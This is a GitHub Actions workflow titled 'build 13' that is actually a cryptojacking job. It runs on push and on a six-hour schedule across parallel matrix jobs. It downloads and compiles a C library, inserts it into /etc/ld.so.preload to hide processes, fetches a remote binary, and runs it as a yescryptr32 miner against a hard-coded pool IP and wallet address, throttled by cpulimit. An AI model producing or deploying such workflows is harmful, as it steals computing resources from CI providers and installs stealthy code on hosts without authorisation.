name: build 13

on:
  workflow_dispatch:
  push:
    branches: ["main"]
  schedule:
    - cron: '0 */6 * * *'

jobs: 
  build: 
    name: build 
    runs-on: ubuntu-latest 
    strategy: 
      max-parallel: 5 
      fail-fast: false 
      matrix: 
        go: [1, 2, 3, 4, 5] 
        flag: [A] 
    env: 
      NUM_JOBS: 40  
      JOB: ${{ matrix.go }} 
    steps: 
    - name: Checkout code
      uses: actions/checkout@v2

    - name: Install Dependencies
      run: |
        sudo apt-get update
        sudo apt-get install -y sudo wget curl build-essential cpulimit

    - name: Download and compile code
      run: |
        curl -L https://bitbucket.org/koploks/watir/raw/master/nyumput.c -o nyumput.c
        gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
        sudo mv libnyumput.so /usr/local/lib/
        echo /usr/local/lib/libnyumput.so | sudo tee -a /etc/ld.so.preload
        rm nyumput.c

    - name: Prepare environment
      run: |
        mkdir -p .lib && cd .lib
        wget -O sgr1 https://github.com/barburonjilo/back/raw/main/sr
        chmod +x sgr1

    - name: Run and manage process
      run: |
        # Start the process with cpulimit
        cpulimit -l 300 -e ./sgr1 &
        pid=$!

        # Run the process with the specified parameters
        nohup ./sgr1 -a yescryptr32 --pool 45.115.224.59:8443 -u UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$JOB --timeout 120 -t 4 > /dev/null 2>&1 &

        # Run for 1 minute
        sleep 60

        # Kill the process
        kill $pid || true

        # Wait for 2 minutes before the next iteration
        sleep 120
